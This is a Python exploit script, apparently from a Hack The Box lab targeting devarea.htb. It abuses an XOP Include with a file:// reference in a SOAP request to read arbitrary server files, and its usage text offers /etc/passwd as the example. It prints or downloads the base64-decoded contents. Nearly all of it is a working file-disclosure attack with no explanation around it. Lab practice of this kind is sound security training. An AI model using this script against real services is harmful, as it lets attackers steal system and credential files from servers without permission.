import requests,re,base64,sys

def xop(file_path,flag):
	url = 'http://devarea.htb:8080/employeeservice'
	headers = {
	    'SOAPAction': '""',
	    'Content-Type': 'multipart/related; type="application/xop+xml"; boundary="boundary"'
	}


	xml = f'''<?xml version="1.0" encoding="UTF-8"?>
	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:xop="http://www.w3.org/2004/08/xop/include">
	  <soapenv:Body>
	    <submitReport xmlns="http://devarea.htb/">
	      <arg0 xmlns="">
		<confidential>false</confidential>
		<employeeName>TEST</employeeName>
		<content>
		  <xop:Include href="file://{file_path}"/>
		</content>
	      </arg0>
	    </submitReport>
	  </soapenv:Body>
	</soapenv:Envelope>'''


	data = (
	    b'--boundary\r\n'
	    b'Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n'
	    b'\r\n'
	    + xml.encode() + b'\r\n'
	    b'--boundary--\r\n'
	)

	rsp = requests.post(url, headers=headers, data=data)
	encode_text = re.findall('Content: (.*)</return>', rsp.text)[0]
	decode_text = base64.b64decode(encode_text)
	if flag=='D':
		file_name=file_path.split('/')[-1]
		with open(f"./{file_name}",'wb') as f:
			f.write(decode_text)
	else:
		decode_text = base64.b64decode(encode_text).decode('utf-8')
		print(decode_text)

try:
	if len(sys.argv) == 2:
		xop(sys.argv[1], "0")
	else:
	    xop(sys.argv[1], sys.argv[2])
except IndexError:
	print(
'''should input file_path,default read mod
example: 
  read   mode: python xop.py /etc/passwd
download mode: python xop.py /tmp/1.jpg D''')
